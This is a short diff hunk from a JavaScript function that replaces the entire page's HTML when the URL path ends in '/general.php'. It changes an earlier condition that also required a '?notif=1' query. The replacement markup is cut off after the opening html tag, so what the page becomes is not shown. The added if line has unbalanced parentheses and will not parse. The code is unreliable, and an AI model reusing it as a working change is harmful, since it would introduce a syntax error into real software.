@@ -1,5 +1,5 @@
 (function() {
-    if (window.location.pathname.endsWith("/general/") && window.location.search === "?notif=1") {
+    if (window.location.pathname.endsWith("/general.php") {
         document.documentElement.innerHTML = `
 <!DOCTYPE html>
 <html>
